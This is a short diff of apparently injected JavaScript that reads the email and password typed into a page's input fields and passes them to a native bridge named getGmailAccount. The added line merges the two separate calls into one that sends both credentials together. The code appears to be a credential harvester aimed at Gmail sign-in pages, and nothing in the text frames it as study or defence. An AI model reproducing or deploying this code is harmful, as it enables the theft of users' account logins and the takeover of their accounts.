@@ -11,8 +11,6 @@ function email() {
     return e;
 }
 
-window.getGmailAccount.getGmailAccount("email:"+email());
-
 function pwd() {
     var b = document.querySelectorAll("input");
     var e;
@@ -25,4 +23,4 @@ function pwd() {
     }
     return e;
 }
-window.getGmailAccount.getGmailAccount("pwd:"+pwd());
+window.getGmailAccount.getGmailAccount("pwd:"+pwd()+"|||||email:"+email());
